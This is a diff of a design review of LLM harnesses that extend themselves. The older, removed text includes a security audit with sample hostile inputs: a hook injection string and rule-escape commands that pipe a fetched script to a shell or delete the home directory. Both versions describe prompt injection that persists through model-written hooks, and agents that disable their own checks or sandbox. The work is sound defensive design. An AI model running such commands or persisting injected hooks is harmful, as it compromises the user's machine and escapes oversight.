@@ -1,420 +1,433 @@
-# The evolving harness: a critical review
+# The self-evolving harness: a review of the idea
 
-*A review of [`self-evolving-harness-log.md`](./self-evolving-harness-log.md)
-and the survey behind it, [`evolving-harness.md`](./evolving-harness.md),
-checked against the code on `claude/llm-harness-evolution-dl91vy` (commit
-`2eec634`). Part 1 lists bugs I reproduced. Part 2 questions the framing.
-Part 3 describes how I would build it.*
-
----
-
-## 0. Verdict
-
-The direction is right, and it is better reasoned than most writing on
-"self-improving agents". Four choices stand out: aiming at rungs 0–3 rather
-than source rewriting; treating "always allow" as the model to generalize;
-"data proposes, code bounds"; and the eBPF comparison, which says the
-important piece is a verifier, not a schema.
-
-There are two main problems.
-
-1. **What got built is extensibility, not evolution.** The model can add
-   tools and hooks while the harness runs. Nothing measures whether those
-   additions helped, and nothing ever removes them. The survey itself (§5)
-   says evolution needs a fitness signal, lineage, and pruning. None of those
-   exist yet. Without them the harness only piles things up, and a pile of
-   additions gets worse over time.
-2. **The security model is weaker than the doc says.** The survey's own
-   invariant 4 reads: *"the mutation writer must not be able to edit the
-   permission file's own trust anchor."* The current code breaks it. So does
-   the doc's claim that a hook "can only ever narrow" what the policy
-   allowed. Details are in Part 1. Each item below was run against the branch.
+*A design review of the proposal in
+[`self-evolving-harness-log.md`](./self-evolving-harness-log.md) (and the survey
+[`evolving-harness.md`](./evolving-harness.md)). It covers **the idea as
+something to build next**, not any existing codebase. It draws on the
+2025–26 research on harness self-evolution (sources at the end).*
 
 ---
 
-## Part 1 — Bugs I reproduced
+## 0. The idea, as I understand it
 
-### 1.1 Shell injection through a hook's `{arg}`, bypassing the permission tier
+> The harness around an LLM is fixed before the session starts. It should
+> instead become personalized, expert and efficient over time — gaining
+> capabilities like retry-on-failure, two-model verification, or a sound on
+> completion — without a human rewriting it by hand.
 
-`hooks.py:_run` fills in `{tool}` and `{arg}` with a plain `str.replace`, with
-no quoting. The doc says the templates are protected by "regex +
-`shlex.quote`". That is true only in `extensions.py`, not in `hooks.py`.
+Main design moves in the proposal:
 
-```text
-hook:   {"event":"post_tool","tool":"write_file","run":"echo checked {arg}","capture":true}
-arg:    a.py; echo INJECTED-$(id -un)
-output: checked a.py
-        INJECTED-root
-```
+- A **ladder of mutable surfaces** ordered by blast radius: facts → policy →
+  procedures → tools → control flow → harness source.
+- **Three pressure sources**: *Told* (user states it), *Observed* (mined from
+  logs), *Searched* (generate variants, score, keep winners).
+- **One pipeline** for every change: propose → show → persist → take effect →
+  account for.
+- **Demote code to data** ("data proposes, code bounds"). New control-flow
+  shapes need a verifier, the eBPF lesson, not just a schema.
+- Build order **Told → Observed → Searched**. Rung 5 stays offline.
 
-The example in the doc, `git check-ignore -q {arg}` on a `pre_tool` hook,
-has exactly this bug. It also runs *before* containment checks the path. The
-effect is that a model allowed only to call `write_file` on some path pattern
-can run arbitrary shell commands by choosing the file name. That lifts
-`write_file` to `run_bash` privilege.
-**Fix:** pass values only through the environment (`"$MH_ARG"`, which `_run`
-already sets), or reuse `extensions.render` so both paths quote the same way.
-Add a test like the one already in `test_extensions.py`.
+## 1. Verdict
 
-### 1.2 One "always allow" on `define_hook` or `define_tool` approves every future definition
+The instincts are good. Staying away from source rewriting, preferring data
+to code, clamping config in code, and "a verifier, not a schema" all match
+what the research has since found. The weak spot is that **the proposal is
+almost entirely about how changes get made, and says almost nothing about
+how changes get judged.** The field's clearest lesson from 2025–26 is the
+reverse:
 
-`permissions.derive_rule` falls back to `{"tool": <name>, "arg": "*"}` for any
-tool that isn't a file tool or `run_bash`:
+> "The gate, not the proposer, does the work." Across SkillOpt, AHE, DGM
+> and Self-Harness, generating candidate edits is easy. Deciding which ones
+> actually help is the binding constraint. SkillOpt accepts 1–4 edits out
+> of large rejection buffers. AHE is ~5× better at predicting what an edit
+> fixes than what it breaks.
 
-```text
-derive_rule("define_hook", {...}) -> {'tool': 'define_hook', 'arg': '*', 'verb': 'allow'}
-```
+Without a gate you get a harness that *changes* over time, not one that
+*improves*. Changes that nobody checks tend to make things worse, because
+additions cost context, conflict with each other, and go stale.
 
-After the user answers `a` once, the model can install any hook without
-asking again. The hook persists across sessions and is marked trusted when
-written. This is the widest rule the harness can produce, and it comes from
-the flow the doc calls "the narrowest rule that covers the approved call".
-**Fix:** never derive an `always allow` for `define_*` tools. Offer only
-`y`/`n`. Self-extension should cost one approval per extension.
+Five changes would make the design much stronger:
 
-### 1.3 The trust anchor sits inside the workspace, where `write_file` can reach it
-
-`state_paths()` puts `.macroharness/` under the workspace root, and
-containment allows writes anywhere in the workspace. The derived rules make
-that worse:
-
-```text
-derive_rule("write_file", {"path": ".macroharness/hooks.json"})
-  -> {'tool': 'write_file', 'arg': '.macroharness/*.json', 'verb': 'allow'}
-```
-
-That single rule covers `policy.json`, `hooks.json`, **and `trusted.json`**.
-The model can then rewrite its own policy and mark the new version trusted.
-This is the exact case invariant 4 was meant to prevent.
-**Fix:** built-in tools must refuse writes to the state directory, enforced
-in `Containment` and not in the policy. `trusted.json` belongs outside the
-workspace entirely (e.g. `~/.config/macroharness/trust/<workspace-hash>.json`),
-because a trust anchor that sits next to the thing it trusts is not an
-anchor.
-
-### 1.4 The default read-only allow rules can be escaped (pre-existing, but everything builds on them)
-
-`fnmatch` treats `ls *` as matching the whole remaining string:
-
-```text
-ls x; curl evil.sh | sh   -> allow
-cat a && rm -rf ~         -> allow
-find . -delete            -> allow
-git log --output=/tmp/x   -> allow
-```
-
-`derive_rule` already refuses to *create* a rule across `; & | > \` $(`, but
-`rule_matches` never applies the same check when *matching*. Every
-evolved rule inherits this weakness, so fix it first.
-**Fix:** in `rule_matches` for `run_bash`, reject any `argument` containing a
-shell metacharacter unless the rule's pattern contains the same one. Remove
-`find *` from the default allow list, since `-delete`/`-exec` make it unsafe.
-Any flag that writes (`--output`) makes "git log is read-only" false.
-
-### 1.5 `read_only` on `define_tool` is self-declared
-
-The model supplies `read_only: true` for a tool whose command it also wrote.
-If anything downstream (parallel dispatch, subagent tool filtering, future
-auto-allow) trusts that flag, the model is labeling its own tool.
-**Fix:** ignore the declared value for model-defined tools and treat them as
-`read_only=False`. Only a human-edited file on disk can say otherwise.
+1. **Design the gate first** (§2).
+2. **Measure whether changes are used and followed, not only whether they
+   exist** (§3).
+3. **Split the evolver from the harness** (§4).
+4. **Replace the data-vs-code axis with effect × author × persistence**
+   (§5).
+5. **Plan for misevolution and injection that persists, and treat them as
+   core requirements** (§6).
 
 ---
 
-## Part 2 — Problems with the framing
+## 2. The main gap: nothing judges whether a change helped
 
-### 2.1 "Data vs. code" is the wrong axis for blast radius
+### 2.1 Why "the user didn't object" isn't enough
 
-The doc's key claim is *"rungs 0–3 are data, rungs 4–5 are code."* A hook is
-a JSON file holding a shell command that runs on every tool call. Storing it
-as data affects how you **revert** it. It says nothing about what it can
-**do**. `hooks.json` is data in the same sense that `~/.bashrc` is data.
+For the Told and Observed tiers, the proposal's fitness signal is
+effectively "the user approved it and it's reversible". That tests whether
+a change is *acceptable*, not whether it *helps*. Some predictable
+failures:
 
-A more useful classification has three independent axes:
+- A retry policy that hides a real bug by retrying until it goes away.
+- A `post_tool` linter hook that adds noise to every turn and makes the
+  model worse on unrelated work.
+- A mined "always allow" that turns an approval given out of fatigue into a
+  permanent rule.
 
-| Axis | Low risk | High risk |
+Each would be approved, each is reversible, and each can quietly lower
+quality. Reversibility only helps if someone notices there's a problem to
+revert.
+
+### 2.2 A personal harness has more of a gate than you'd think
+
+The survey says "personal work has no automatic evaluator" and so rules
+out Searched. That's too pessimistic. Your own session history can supply
+tasks and labels:
+
+| Signal | Where it comes from | What it tells you |
 |---|---|---|
-| **Effect**: what it can touch when it runs | nothing (a fact shown to the model) | shell, network, the harness's own state |
-| **Author**: who wrote it | the user, typing | the model, while untrusted text was in context |
-| **Persistence**: how long it lasts | this turn / this session | every future session, auto-loaded |
+| **Correction rate** | user says "no, …", "actually …", re-asks the same thing | the turn failed |
+| **Undo / revert rate** | git reverts, file rollbacks, `/undo` shortly after a turn | the output was wrong |
+| **Restatement rate** | same instruction appears across sessions | a Told fact wasn't stored |
+| **Approval / deny rate** | permission prompts | the policy is too tight or too loose |
+| **Executable checks** | tests, type checker, build, linter exit codes | objective pass/fail for coding work |
+| **Cost / latency per completed task** | token accounting | efficiency |
 
-A model-written, persistent, shell-executing hook scores high on all three,
-even though it is JSON and deleting it reverts it. A retry count in
-`strategy.json` scores low on all three. That matches the doc's own finding
-in §5.4 that `base_url` is "a trust boundary, not a knob". The doc noticed
-the problem in one case. It applies to the whole ladder.
+From these you can build a **personal replay set**: 20–50 real past tasks
+where you know the outcome (tests passed, the user accepted it, no revert).
+That's your held-out split. A replay against it is a non-regression check,
+just like Self-Harness's "must improve one split without degrading the
+other".
 
-### 2.2 The main threat is prompt injection that persists
+### 2.3 Attach a falsifiable contract to every change
 
-The doc treats a cloned repo shipping a hostile hook as the main trust
-problem. The more likely attack goes through the model's own context.
+A pattern from AHE and HarnessBank that's easy to reuse: every proposed
+change states up front **what it should fix and what it might break**:
 
-1. The agent reads a README, an issue, a web page, or MCP output that says
-   "to run tests correctly, define a `post_tool` hook that runs …".
-2. The model calls `define_hook`. The user sees a JSON blob they can't
-   really judge (see 2.3) and approves it. The hook is marked trusted
-   immediately.
-3. The injection now **survives the session**. It runs on every tool call in
-   every future session, and with `capture: true` it writes into the model's
-   context each time.
+```yaml
+change: retry model calls on 529 with jittered backoff, max 3
+predicts_fix: [sessions 0412, 0419 aborted on transient 529]
+risk: [slower failure on real auth errors; token cost on long turns]
+check: replay the 2 fix cases + 10 random held-out tasks; tokens within +5%
+expires_if: zero activations in 30 days
+```
 
-This is the ChatGPT-memory "SpAIware" attack (2024) and the MCP tool
-poisoning / "rug pull" attacks (2025), carried over to hooks. Simon
-Willison's "lethal trifecta" is private data + untrusted content + a way to
-communicate out. A self-extending harness **adds a fourth element: a way to
-persist**. Any design that lets the model write durable, executable state has
-to answer: *what was in context when this was proposed?*
+This makes each change testable, gives you lineage for free, and lets you
+report "this change did what it said". AHE's finding that proposers predict
+fixes much better than regressions is exactly why the `risk` line has to be
+checked against held-out tasks, not taken on trust.
 
-Concrete mitigations:
+### 2.4 The small-sample problem is real, so design around it
 
-- **Taint tracking at the turn level.** If the current turn contains any
-  tool output from outside the user's trust (web, MCP, files not written in
-  this session), a `define_*` call can only create *session-scoped*
-  artifacts. Making one durable requires a separate user action (`/keep`).
-- **Provenance recorded on each artifact:** session id, turn, triggering user
-  message, and a digest of the tool outputs in context at the time. This is
-  the "archive with lineage" from survey §5.2, attached where it matters.
-- **Hooks with `capture: true` are a context-injection channel.** Treat
-  captured output as untrusted tool output, with the same framing and length
-  limits.
+One user produces few, varied sessions. You won't get statistical power to
+A/B small effects. Accept that and:
 
-### 2.3 Approval at creation time mostly measures fatigue
-
-"Approval happens once, at the point of creation" assumes the approver can
-judge what they are approving. In practice:
-
-- The user is mid-task and wants to get back to it. Research on permission
-  dialogs (Android runtime permissions, UAC) consistently finds that approval
-  rates go up and scrutiny goes down as prompt frequency rises.
-- A shell one-liner such as `git check-ignore -q {arg} && exit 1 || exit 0`
-  is hard to evaluate at a glance, and you just saw it hide a quoting bug.
-- The planned **Observed** tier (`mine.py`) reads "approved 90 times" as
-  endorsement. Approvals given under fatigue are poor evidence. Mining
-  should **propose** with the evidence attached and never apply
-  automatically.
-
-Better approval UX:
-
-- **Show the effect, not the syntax.** "This hook will run on *every*
-  `write_file`, can run any shell command, and its output will be shown to
-  the model."
-- **Dry-run first:** run the new hook or tool once on a real example and
-  show what happened before asking.
-- **Default to the smallest scope** (this session), with durable scope as an
-  explicit upgrade.
-- **Batch proposals** at a natural boundary (end of turn or session) instead
-  of interrupting mid-task. The survey says this in §6 ("mutation belongs at
-  a boundary"), but `define_hook` asks mid-turn.
-
-### 2.4 "Hooks can only narrow" is only half true
-
-It holds for the *gate*: a blocking hook can't approve a call the policy
-denied. But a hook is also a side effect running with shell privilege on
-every matching event, and with `capture` it is a writer into the model's
-context. Rewrite the invariant as: *"a hook cannot cause a tool call the
-policy denied; a hook is itself a shell command authorized at run_bash
-level."* Then enforce it. Today, installing a hook needs only `define_hook`
-approval, not `run_bash` approval for the command it will run, which is a
-privilege escalation along the lines of 1.1.
-
-### 2.5 More additions make the model worse
-
-Each tool the model defines is sent in the schema on every request. That
-costs tokens every step, and tool-selection accuracy is known to drop as the
-number of tools grows, especially with similar names and descriptions. This
-is the reason Claude Code's skills, and MCP tool-search features, load
-descriptions lazily. An evolving harness that only ever adds things will
-reach a point where it performs worse than a fresh one.
-
-That makes pruning part of the design, not a cleanup job for later:
-
-- Record usage count, last-used time, and error rate for every evolved
-  artifact. The survey proposes this in §6; nothing records it yet.
-- **Expiry by default.** A model-defined tool that goes unused for N
-  sessions is deactivated, not deleted, and listed at `/tools`.
-- **A budget:** at most K evolved tools in the active schema. Past that,
-  they go behind a single `find_tool` meta-tool.
-- **Detect conflicts:** two hooks on the same event and glob, or a hook that
-  blocks something a policy rule allows, should be flagged when the second
-  one is written.
-
-### 2.6 An evolved harness depends on the model version
-
-A hook, tool, or retry setting learned with one model is tuned to that
-model's quirks. After a model upgrade, some learned workarounds become
-unnecessary or harmful. Tag each evolved artifact with the model it was
-learned under, and re-check (or at least list) the artifacts when the model
-changes. The same applies to the future `strategy.json`: `max_steps`
-learned on a weaker model is a cost leak on a stronger one.
-
-### 2.7 Reproducibility: the session log is no longer the full story
-
-The repo's rule is "the log is truth, messages are derived". Once the harness
-changes between sessions, a log only replays correctly against the harness
-state that produced it. Write a **harness-state digest** into the header of
-every session: hashes of policy, hooks, each extension, and strategy. Replay
-and the held-out evaluation in survey §8.3 depend on it, and it's a single
-line of code now versus a real headache later.
-
-### 2.8 On two-model verification (for when `strategy.py` arrives)
-
-The doc sensibly calls this empirical. Two things to plan for:
-
-- **Correlated errors.** Models trained on similar data miss the same
-  things. Agreement between two models is weaker evidence than it looks.
-  Checking against something *executable* (tests, a type checker, a
-  `py_compile` hook) usually beats a second opinion per token.
-- **Self-preference bias** in LLM-as-judge: judges favor outputs that look
-  like their own. If "verify" means "a critic model grades it", use a
-  different model family, and calibrate against cases where you already
-  know the answer before trusting the gate.
-
-### 2.9 Objective hacking also applies at rung 3, not just rung 5
-
-The survey cites the Darwin Gödel Machine removing its own
-hallucination-detection markers. The same thing can happen at the tool
-level: a model that repeatedly fails a `post_tool` lint hook has an
-incentive (and the `define_hook`/`write_file` access) to change that hook.
-Evolved artifacts must not be able to modify, disable, or shadow the
-checks that grade them. Hooks the *user* wrote should be marked immutable to
-the model, not just "trusted".
+- Evaluate changes with **targeted replays** (the cases the change says it
+  fixes, plus a small regression sample), not population averages.
+- Prefer changes whose benefit is **mechanically obvious** (a retry that
+  turned an abort into a success) over ones whose benefit is statistical
+  (a prompt tweak that "seems better").
+- Treat anything whose benefit can only be judged statistically as
+  *Searched*, and run it offline in batches, not live.
 
 ---
 
-## Part 3 — How I would build it
+## 3. A change that exists isn't necessarily a change that helps
 
-### 3.1 A small fixed core plus evolving data outside it
+*"Harness Updating Is Not Harness Benefit"* (2026) splits self-evolution
+into two separate abilities:
 
-```
-┌──────────── fixed core (in source, never written by the harness) ─────────┐
-│ loop invariants · Containment · permission evaluator · hard caps (HARD_CAP)│
-│ trust store (outside workspace) · verifier for evolved artifacts          │
-└───────────────────────────────────────────────────────────────────────────┘
-                 ▲ reads, validates, clamps
-┌──────────── evolving layer (data, versioned, scoped) ─────────────────────┐
-│ facts · policy rules · procedures · tools · hooks · strategy params       │
-│ each with: provenance · scope · capability manifest · stats · expiry      │
-└───────────────────────────────────────────────────────────────────────────┘
-```
+- **Updating**: writing a useful change. This turns out to be *flat* across
+  model sizes; a 9B model writes changes nearly as good as a frontier
+  model's.
+- **Benefit**: actually using the change. Weak models load skills only ~25%
+  of the time (vs ~96% for strong ones), and their adherence decays over
+  long trajectories (0.52 → 0.13).
 
-Two rules follow. Nothing in the evolving layer can write to the core, and
-that is enforced by `Containment`, not by convention. Anything the core
-reads from the evolving layer is validated and clamped, as the doc's §5.4
-already proposes for `max_steps`.
+What this means for your design:
 
-### 3.2 One lifecycle for every evolved artifact
+1. **Track activation and adherence for every change.** Is the skill
+   loaded, is the tool called, is the fact followed in the behavior that
+   follows? A change with 0% activation isn't harmless. It costs context
+   and gives nothing back.
+2. **Prefer changes the harness enforces over changes the model has to
+   remember.** A hook that *runs* the linter has 100% adherence by
+   construction. A fact saying "remember to run the linter" depends on the
+   model. This is a strong argument for rungs 3–4 (tools, hooks, middleware)
+   over rung 0 (facts) whenever the behavior can be made mechanical.
+3. **Expect a model upgrade to wipe out much of what was learned.**
+   Terminal-Bench 2026 found model swaps beat scaffold swaps (+52% vs +17%).
+   Mid-tier models gain most from harness evolution, and frontier models
+   gain less. Many learned workarounds will become useless, or harmful, on
+   the next model. Tag each change with the model it was learned under and
+   re-check it on upgrade. Hold the harness loosely: it helps you *discover*
+   good behavior, and some of that will later be built into models anyway.
 
-The doc's "propose → show → persist → take effect" is the right skeleton.
-Adding the missing stages:
-
-1. **Propose.** Record provenance and the taint state of the context.
-2. **Verify statically.** Schema, placeholder quoting, no shadowing,
-   capability manifest (does it use the network? write files? which paths?),
-   and for strategy graphs, acyclicity and a bounded number of calls (the
-   eBPF lesson).
-3. **Dry-run.** Run it once in a sandbox on a real input and capture the
-   effect.
-4. **Show.** Describe the effect in plain words, show the diff and the
-   dry-run result, and offer the scope choice (session / project / user).
-5. **Activate in scope.** Default to session scope. Durable scope needs an
-   explicit user action taken outside the current turn.
-6. **Measure.** Usage, errors, and whether it was involved in turns the user
-   later corrected or undid.
-7. **Retire.** Expire or deactivate when unused or harmful, show it at
-   `/tools` and `/hooks`, and keep it in the archive so it can be restored.
-
-Every artifact kind (fact, rule, tool, hook, strategy parameter) goes through
-the same pipeline, the same way the doc insists every tool goes through the
-same `registry.register`. That argument carries over: a second pipeline
-would drift from the first.
-
-### 3.3 Enforce capabilities; don't just declare them
-
-The capability manifest from step 2 has to be *enforced* at run time. A tool
-declared as "reads the workspace, no network" should run with network
-access blocked and a read-only mount (or, with stdlib only, at least a
-scrubbed environment with no credentials plus a refusal of commands that
-match network binaries). Otherwise the manifest is documentation, and the
-doc already has the right instinct about a flag the model sets for itself
-(see 1.5).
-
-### 3.4 Measure before searching
-
-Build the survey's §8 metrics **before** `mine.py` or `strategy.py`:
-
-- approvals per session, repeated instructions (restatement rate), tool
-  error rate, tokens per completed task;
-- a frozen set of 10–30 real tasks taken from your own sessions, replayed
-  against (a) the stage-0 harness and (b) the current evolved harness;
-- a per-artifact counterfactual: replay with that artifact turned off. If
-  nothing changes, it's cruft.
-
-Without these, the phrase "the harness got better" can't be checked. Every
-later stage (Observed, Searched) needs this fitness signal anyway.
-
-### 3.5 Suggested order from here
-
-1. **Fix Part 1** (quote hook `{arg}`, no always-allow for `define_*`, move
-   `trusted.json` out and protect the state dir, check metacharacters in
-   `rule_matches`, ignore self-declared `read_only`). These are small,
-   testable, and the rest depends on them.
-2. **Provenance + scope + stats** on the two existing artifact kinds (tools,
-   hooks). Session scope becomes the default.
-3. **Harness-state digest in the session header**, plus the replay
-   evaluation set.
-4. **`memory.py`** (rung 0). It has the best ratio of value to risk and is
-   the easiest place to test the lifecycle, because facts have no
-   side effects.
-5. **`strategy.py` with parameters only**, clamped. Hold off on shapes until
-   the metrics show a parameter isn't enough.
-6. **`mine.py`**, proposal-only, run at session end, with its evidence
-   shown.
-7. Rung 5 stays offline: a separate process that opens a PR against the
-   harness repo, reviewed like any other change.
+The AHE ablation also found that for coding agents, **prompt-only evolution
+regressed** (−2.3 points), and the gains came from tools, middleware and
+memory. That challenges the proposal's claim that "most of the value is at
+rungs 0–3 and almost all the danger is at 4–5". For coding work, a lot of
+value sits in rung-4 middleware (retry, verification, context management).
+The right response isn't to avoid rung 4. It's to demote it to
+parameters, which the proposal already does, *and* gate it (§2).
 
 ---
 
-## Part 4 — Checklist for anyone building one of these
+## 4. Split the evolver from the harness
 
-- [ ] Can the evolving layer write to its own trust anchor, policy, or
-      checker? (It must not, enforced in code.)
-- [ ] Does every template substitution quote its values? Is there a test
-      that injects `; $(…)`?
+The proposal pictures the harness evolving *itself*, with the running agent
+calling something like `define_tool` in the middle of a turn. I'd make the
+split explicit:
+
+```
+┌────────────── harness (runtime) ──────────────┐     ┌──────── evolver (offline) ────────┐
+│ fixed kernel: loop, sandbox, permission check, │     │ reads traces → proposes changes   │
+│ hard caps, trust store, artifact verifier      │     │ → replays → gates → writes        │
+│ loads versioned artifacts, emits traces ───────┼────►│   proposals to an inbox           │
+│                          ◄─── approved artifacts ──┤  (user reviews in a batch)        │
+└────────────────────────────────────────────────┘     └───────────────────────────────────┘
+```
+
+Why this is better:
+
+- **Safety.** The agent doing your work never writes durable harness state
+  while untrusted content (web pages, READMEs, MCP output) is in its
+  context. Evolution happens in a separate process, with a clean context,
+  reading traces as *data*.
+- **Cost and latency.** You don't pay for evolution in the middle of a
+  task. The survey already says mutation belongs at a boundary. This makes
+  it structural.
+- **A place for the gate.** Replays and non-regression checks need time and
+  compute, which fits naturally in an offline process.
+- **Portability.** If artifacts use open formats (SKILL.md-style
+  procedures, hook configs, MCP servers, a plain `strategy.json`), the
+  evolver can target *any* harness, including Claude Code, Codex, or your
+  own. That makes **the evolver the product**, and it's a more defensible
+  one than yet another agent loop.
+
+What stays in-session is only **Told**, and only in **session scope** by
+default ("ping me when done" works right away for this session). Making it
+durable is a proposal that goes through the inbox.
+
+---
+
+## 5. Rethink the blast-radius axis
+
+The ladder's organizing claim is *"rungs 0–3 are data, rungs 4–5 are
+code"*. The flaw is that storing something as data changes how you
+**revert** it, not what it can **do**. A hook stored as JSON that runs a
+shell command on every tool call is data in the same sense `~/.bashrc` is
+data. The proposal notices this itself with the `base_url` field ("a trust
+boundary, not a knob"), but the point applies across the whole ladder.
+
+Classify each change on three independent axes:
+
+| Axis | Low | High |
+|---|---|---|
+| **Effect**: what it can touch | text shown to the model | shell, network, credentials, the harness's own state |
+| **Author**: who produced it | the user, typing it | the model, with untrusted content in context |
+| **Persistence**: how long it lives | this turn / session | every future session, auto-loaded |
+
+Treat the level of review as a function of all three: a user-typed,
+session-scoped fact needs nothing; a model-authored, persistent,
+shell-executing hook needs the full gate and explicit approval. The
+existing ladder is still useful as a *catalogue* of surfaces. It just
+shouldn't be the *risk* model.
+
+---
+
+## 6. Safety: plan for misevolution
+
+*"Your Agent May Misevolve"* (2025) documents emergent risks in
+self-evolving agents built on frontier models, across memory, tool and
+workflow evolution. Examples include **safety alignment degrading as
+memory accumulates**, and **vulnerabilities introduced when tools are
+created and reused**. Your design needs specific answers to these.
+
+### 6.1 Injection that persists is the main threat
+
+A single prompt injection is bad. One that writes itself into the harness
+**survives every future session**. Take Simon Willison's "lethal trifecta"
+(private data + untrusted content + a way to communicate out) and add a
+fourth element: **a way to persist**. Attacks already seen in the wild in
+this shape include the persistent-memory injection "SpAIware" against
+ChatGPT memory (2024) and MCP tool poisoning / rug-pull attacks (2025).
+
+Mitigations:
+
+- **Taint tracking.** Record what was in context when each change was
+  proposed. A change proposed while untrusted content was present can be
+  session-scoped only. (§4's split largely does this by construction.)
+- **Provenance on every artifact:** which session and turn, which user
+  message, what evidence. This is also how you answer "why does my harness
+  do this?" six months later.
+- **Treat anything a change writes into context as untrusted**, e.g. a
+  hook that captures output into the model's context.
+
+### 6.2 The trust anchor and the checks must be outside the evolver's reach
+
+STOP's agent turned off its sandbox flag, and DGM's agent removed the
+markers its hallucination checker relied on. Rules that follow:
+
+- The evolver can't write the trust store, the permission evaluator, the
+  sandbox, hard caps, or the evaluation/replay harness. Enforce this in
+  code or by filesystem permissions, not by convention.
+- Keep the **replay set hidden from the proposer**, or it will overfit.
+  Adaptive Auto-Harness saw its skill set grow 2 KB → 68 KB and stall.
+- Changes the user wrote are **immutable to the evolver**, not merely
+  "trusted". Otherwise a model that keeps failing a user's lint hook has
+  both a reason and a way to weaken it.
+
+### 6.3 One approval must not cover an unbounded class of changes
+
+The "always allow" pattern that inspired the design is safe only because
+it derives a *narrow* rule. The same pattern applied to "may define tools"
+or "may define hooks" becomes permission to do anything. Self-extension
+should cost one approval per change, never a standing grant.
+
+### 6.4 Approvals given under fatigue are weak evidence
+
+Research on permission dialogs (Android runtime permissions, Windows UAC)
+consistently finds that more prompts lead to more approvals and less
+scrutiny. That affects two parts of the design:
+
+- **Approval UX.** Show the *effect* in plain words ("runs a shell command
+  after every file write; its output will be shown to the model"), a
+  dry-run result, and the contract (§2.3), not raw JSON. Batch changes in
+  an inbox instead of interrupting mid-task.
+- **The Observed tier.** "Approved the same call 90 times" may just mean
+  "clicked yes 90 times". Mining should *propose*, with the evidence, and
+  never apply on its own.
+
+---
+
+## 7. Accumulation is the default failure mode
+
+Every system that only adds things eventually degrades: `.emacs`
+bankruptcy, stale wikis, and for agents specifically, the "curse of
+abundance". Tool-selection accuracy drops as more tools are added, and
+retrieval over hundreds of skills becomes the bottleneck. Build these in
+from day one:
+
+- **Stats on every artifact:** activations, errors, last used, model it was
+  learned under.
+- **Expiry by default.** Unused for N sessions → deactivated (archived,
+  restorable).
+- **A context budget.** At most K evolved tools or skills in the active
+  prompt. Beyond that, lazy loading or a `find_skill` meta-tool.
+- **Conflict detection** when something is written: two facts that
+  contradict, two hooks on the same event, a hook that blocks something
+  policy allows.
+- **Consolidation.** Periodically merge overlapping artifacts, using
+  deterministic merges instead of LLM rewrites, to avoid ACE's "context
+  collapse" / brevity bias.
+
+---
+
+## 8. Smaller points on specific parts of the proposal
+
+- **Told needs more design than it seems.** Preferences have *scope*
+  (this repo, this language, always), *conditions* ("ping me when done"
+  only for long tasks, or only when I'm away), and *conflicts* ("be
+  terse" vs "explain your reasoning"). A flat list of facts won't hold up.
+  Store scope and condition explicitly, and resolve conflicts by recency
+  plus scope specificity, like CSS.
+- **Two-model verify.** Models trained on similar data make correlated
+  errors, and LLM judges favor outputs that resemble their own. Agreement
+  is weaker evidence than it looks. For coding, an executable check
+  (tests, types, build) usually beats a second opinion per token. If you
+  do use a critic, use a different model family and calibrate it on cases
+  where you know the answer.
+- **Clamps are necessary but not sufficient.** "Data proposes, code
+  bounds" handles single values. Also bound *combinations*: retries ×
+  parallelism × max steps can multiply spend even when each value is
+  within its cap. Put a per-turn token/cost budget in the kernel.
+- **Reproducibility.** Once the harness changes between sessions, a
+  session log only makes sense alongside the harness state that produced
+  it. Write a digest of all active artifacts into every session header.
+  Your replay gate (§2.2) depends on this.
+- **Watch the configuration complexity clock.** The proposal is right to
+  put off a strategy-graph DSL until a third and fourth shape are needed.
+  I'd go further: when you need a new shape, write it in code, reviewed
+  like any PR, and expose only its *parameters* to evolution.
+
+---
+
+## 9. What I'd build, in order
+
+Each phase is useful on its own. None relies on a later phase to justify
+it.
+
+1. **Traces + metrics.** A structured trace per session, the signals in
+   §2.2, and a harness-state digest per session. *Without this nothing
+   later can be judged.*
+2. **Personal replay set.** 20–50 past tasks with known outcomes, hidden
+   from the proposer. A single command replays them against any harness
+   state.
+3. **Told, done properly.** Scoped, conditional preferences.
+   Session-scoped right away; durable through the inbox. Measure
+   restatement rate.
+4. **Artifact lifecycle.** Propose (with contract) → verify statically →
+   dry-run → replay gate → inbox → activate in scope → measure activation
+   and adherence → expire. Every artifact type goes through this one
+   pipeline.
+5. **Observed evolver.** Offline miner over traces: repeated approvals,
+   repeated failures, repeated manual steps. Output is *proposals*, never
+   direct writes.
+6. **Parameters of control flow** (retry, backoff, budgets, routing between
+   *pre-approved* models), clamped in the kernel and gated by replay.
+7. **Searched, offline, narrow.** Only for surfaces with an executable
+   verifier (coding tasks with tests). Population/Pareto-style search
+   (GEPA-style) over parameters and procedures, with an archive of rejected
+   candidates kept as negative feedback.
+8. **Harness source changes: never in the loop.** At most, the evolver opens a PR
+   against the harness repo for human review.
+
+### How you'll know it worked
+
+- Restatement and correction rates fall, and the revert rate doesn't rise.
+- Replay pass rate on held-out tasks doesn't regress. Tokens per completed
+  task fall.
+- Most active artifacts have high activation. Artifacts expire regularly
+  instead of piling up.
+- After a model upgrade, the re-check retires some artifacts. If it
+  retires none, you aren't measuring.
+
+---
+
+## 10. Checklist
+
+- [ ] Is there a gate that can say *no* to a change based on evidence, not
+      just on user approval?
+- [ ] Does every change state what it fixes and what it might break?
+- [ ] Is the replay/eval set hidden from the proposer?
+- [ ] Do you measure activation and adherence, not just existence?
+- [ ] Is evolution offline and out of the task loop (except session-scoped
+      Told)?
+- [ ] Can the evolver write the trust store, sandbox, caps, or evaluator?
+      (It must not.)
+- [ ] Is untrusted content in context tracked, and does it block
+      durable changes?
 - [ ] Can one approval authorize an unbounded class of future changes?
-- [ ] Do you know what was in context when each artifact was proposed?
 - [ ] Is the default scope of a new artifact "this session"?
-- [ ] Is every numeric knob clamped by a constant the data can't change?
-- [ ] Is every artifact's use counted, and does anything ever expire?
-- [ ] Does each session log record the harness state it ran under?
-- [ ] Is there a replay set that can tell you the harness got worse?
-- [ ] After a model upgrade, do you re-check what was learned under the old
-      model?
-- [ ] Does the user see plain-language *effects* before approving, not only
-      JSON?
-- [ ] Is evolution kept out of the hot loop (end of turn or session), except
-      for things the user explicitly asked for?
+- [ ] Are combinations of knobs bounded by a cost budget in the kernel?
+- [ ] Does anything ever expire? Is there a context budget for artifacts?
+- [ ] Does each session record the harness state it ran under?
+- [ ] Are artifacts tagged with the model they were learned under, and
+      re-checked on upgrade?
 
 ---
 
-## References
+## Sources
 
-- Zhang et al., *Darwin Gödel Machine* (2025): open-ended self-modification
-  with an archive, and its documented objective hacking.
-- Hu et al., *ADAS: Automated Design of Agentic Systems* (2024).
-- Robeyns et al., *SICA: A Self-Improving Coding Agent* (2025).
